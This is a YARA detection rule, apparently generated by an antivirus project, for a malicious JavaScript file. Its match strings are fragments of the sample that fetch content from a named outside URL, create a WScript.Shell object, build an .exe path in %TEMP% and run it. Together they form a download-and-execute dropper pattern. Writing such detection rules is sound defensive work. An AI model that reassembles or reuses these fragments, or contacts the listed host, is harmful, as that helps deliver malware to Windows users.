rule sig_20160330_61121342d6dff4d96f0ed709e5abf21b {
  meta:
    description = "datamaliciousorder - file 20160330_61121342d6dff4d96f0ed709e5abf21b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0c9f5b8ae955a41070ada552947d3522b51e72b32bdf06234c6038fe50dd5fd1"

  strings:
    $s1  = "NF[NY](\"GET\", \"http://arcfestoheni.hu/n3usad\", false);" fullword ascii
    $s2  = "var IT = function B() {return WScript[GK](\"WScript\"+\".Shell\");}(), FZ = 11;" fullword ascii
    $s3  = "function EO(ZF, XT){YV = YV * 1; return ZF - XT;};" fullword ascii
    $s4  = "if (NF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function O() {return IT[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ge6eGn2PJww.ex\" + \"e\";};" fullword ascii
    $s6  = "function NR(){return RZ + \"\";};" fullword ascii
    $s7  = "function CN() {return ((L == true) && (L == B1)) ? 1 : YV;};" fullword ascii
    $s8  = "function G(Z){IT[\"Run\"](Z, YV, YV);};" fullword ascii
    $s9  = "function Q(){return 22;};" fullword ascii
    $s10 = "function AD(){return GK;};" fullword ascii
    $s11 = "return EO(CD, X0);" fullword ascii
    $s12 = "function YZ(VR) {var YF = (1, 2, 3, 4, 5, VR); return YF;};" fullword ascii
    $s13 = "var SB = new this[\"Date\"]();" fullword ascii
    $s14 = "function QO()" fullword ascii
    $s15 = "}while (G0);" fullword ascii
    $s16 = "var L = false;" fullword ascii
    $s17 = "L = true; " fullword ascii
    $s18 = "var B1 = false;" fullword ascii
    $s19 = "var VU = false;" fullword ascii
    $s20 = "B1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}